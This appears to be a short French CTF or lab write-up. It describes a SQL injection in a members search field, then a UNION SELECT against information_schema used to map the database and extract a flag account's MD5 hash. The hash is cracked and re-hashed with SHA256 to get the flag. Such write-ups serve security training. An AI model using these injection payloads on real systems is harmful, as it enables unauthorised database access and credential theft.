Injection SQL

Aller dans l'onglet MEMBERS
Taper dans la recherche '1 OR true' pour afficher tous les membres

On peut voir un compte :
First name: Flag
Surname : GetThe

Nous voulons trouver toutes les tables et colonnes associer à la database

1 UNION SELECT table_name, column_name FROM information_schema.columns

Structure des tables de la DB:
USERS(user_id, first_name, last_name, town, country, planet, Commentaire, countersign)
GUESTBOOK(id_comment, comment, name)
LIST_IMAGES(id, url, title, comment)
VOTE_DBS(id_vote, vote, nb_vote, subject)

Nous allons donc récupérer toutes les informations de notre compte Flag :

user_id: 5
first_name: Flag
last_name: GetThe
town: 42
country: 42
planet: 42
Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign: 5ff9d0165b4f92b14994e5c685cdce28

On peut voir un code chiffré dans la colonne 'countersign', on va la décoder à l'aide du site dcode, c'est un chiffrement MD5 (FortyTwo), dans la colonne commentaire il est demandé de dechiffrer le mot de passe, de le mettre en minuscule et de le chiffrer en SHA256, ce qui donne fortytwo -> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
